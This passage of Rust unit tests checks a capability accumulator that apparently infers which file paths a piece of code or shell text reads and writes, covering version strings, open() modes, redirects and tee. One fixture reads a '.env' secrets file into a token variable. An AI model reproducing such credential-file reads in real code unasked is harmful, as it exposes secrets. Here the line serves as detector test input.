    fn a_version_is_not_a_filesystem_path() {
        // A user-agent string put `Chrome/120.0.0.0` and `Safari/537.36` into
        // `fs read`, which then fed declared-vs-observed. A version segment is
        // not a directory.
        let mut a = Accumulator::new();
        a.add_text("const ua = \"Chrome/120.0.0.0 Safari/537.36\";");
        let cap = a.finish();
        assert!(
            cap.filesystem_read.is_empty(),
            "a version is not a path: {:#?}",
            cap.filesystem_read
        );
    }

    #[test]
    fn a_relative_path_is_still_a_path() {
        // The version check must not swallow ordinary relative paths.
        let mut a = Accumulator::new();
        a.add_text("open('data/input.txt')");
        let cap = a.finish();
        assert!(
            cap.filesystem_read.iter().any(|p| p.ends_with("input.txt")),
            "{:#?}",
            cap.filesystem_read
        );
    }

    #[test]
    fn known_dotfiles_are_still_paths() {
        let mut a = Accumulator::new();
        a.add_text("token = open('.env').read()");
        let cap = a.finish();
        assert!(
            cap.filesystem_read.iter().any(|p| p == ".env"),
            ".env is a real path: {:#?}",
            cap.filesystem_read
        );
    }

    // ── issue #3: read vs write from the call, not from proximity ─────────

    #[test]
    fn open_without_a_mode_is_a_read() {
        let mut a = Accumulator::new();
        a.add_text("f = open('x.txt')");
        let cap = a.finish();
        assert!(
            cap.filesystem_read.iter().any(|p| p.ends_with("x.txt")),
            "{:#?}",
            cap.filesystem_read
        );
        assert!(
            cap.filesystem_write.is_empty(),
            "{:#?}",
            cap.filesystem_write
        );
    }

    #[test]
    fn open_with_a_literal_write_mode_is_a_write() {
        let mut a = Accumulator::new();
        a.add_text("g = open('y.txt', 'w')");
        a.add_text("with open('out.csv', 'w') as h:");
        let cap = a.finish();
        assert!(
            cap.filesystem_write.iter().any(|p| p.ends_with("y.txt")),
            "{:#?}",
            cap.filesystem_write
        );
        assert!(
            cap.filesystem_write.iter().any(|p| p.ends_with("out.csv")),
            "a `with open(..., 'w')` is a write: {:#?}",
            cap.filesystem_write
        );
    }

    #[test]
    fn open_with_a_variable_mode_is_a_read_plus_a_note() {
        // Acceptance #2: do not silently claim it is a read. Count it as one
        // (conservative) but say the mode could not be resolved.
        let mut a = Accumulator::new();
        let notes = a.add_text("f = open('data/x.csv', mode)");
        let cap = a.finish();
        assert!(
            cap.filesystem_read.iter().any(|p| p.ends_with("x.csv")),
            "{:#?}",
            cap.filesystem_read
        );
        assert!(
            cap.filesystem_write.is_empty(),
            "{:#?}",
            cap.filesystem_write
        );
        assert_eq!(notes.len(), 1, "exactly one unresolved mode: {notes:?}");
        assert!(notes[0].contains("could not be resolved"), "{notes:?}");
    }

    #[test]
    fn redirects_and_tee_are_writes() {
        let mut a = Accumulator::new();
        a.add_text("echo hi > out.txt");
        a.add_text("cmd >> log.txt");
        a.add_text("printf x | tee report.md");
        let cap = a.finish();
        for name in ["out.txt", "log.txt", "report.md"] {
            assert!(
                cap.filesystem_write.iter().any(|p| p.ends_with(name)),
                "{name} must be a write: {:#?}",
                cap.filesystem_write
            );
        }
    }

    #[test]
    fn a_plain_read_command_is_a_read() {
        let mut a = Accumulator::new();
        a.add_text("cat in.txt");
        let cap = a.finish();
        assert!(
            cap.filesystem_read.iter().any(|p| p.ends_with("in.txt")),
            "{:#?}",
            cap.filesystem_read
        );
        assert!(
            cap.filesystem_write.is_empty(),
            "{:#?}",
            cap.filesystem_write
        );
    }

    #[test]
    fn a_nested_call_does_not_hide_the_mode() {
        let mut a = Accumulator::new();
        a.add_text("with open(os.path.join(dir, 'x.csv'), 'w') as f:");
        let cap = a.finish();
        assert!(
            cap.filesystem_write.iter().any(|p| p.ends_with("x.csv")),
            "an outer `open(..., 'w')` must win over the inner join: {:#?}",
            cap.filesystem_write
        );
    }
}
